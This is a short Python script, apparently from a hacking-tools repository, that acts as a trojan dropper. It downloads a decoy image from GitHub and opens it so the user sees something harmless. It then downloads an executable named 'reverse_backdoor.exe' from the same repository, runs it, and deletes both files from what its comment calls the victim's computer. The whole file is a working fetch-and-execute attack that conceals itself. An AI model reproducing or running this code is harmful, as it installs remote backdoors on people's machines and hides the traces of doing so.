
import subprocess
import requests
import os
import tempfile


# The url of the image or file to be download
url = "https://raw.githubusercontent.com/juancv3d/Hacker_Tool_Automation/main/malware/samples/gengar.png"
# The url of the executable
exe = 'https://github.com/juancv3d/Hacker_Tool_Automation/raw/main/malware/samples/reverse_backdoor.exe'


def download(url):
    """This Function will download any file from the url provided

    Args:
        url (string): the url of the file to download
    """
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as f:
        f.write(get_response.content)
    print("[+] Downloading...")


if __name__ == '__main__':
    # Create a temporary directory
    temp_dir = tempfile.gettempdir()
    # Change the working directory to the temporary directory
    os.chdir(temp_dir)
    # Download the file that is going to be executed
    download(url)
    subprocess.Popen('gengar.png', shell=True)
    # Download the executable
    download(exe)
    subprocess.call("reverse_backdoor.exe", shell=True)
    # we remove the file from the victims computer
    os.remove('gengar.png')
    os.remove('reverse_backdoor.exe')
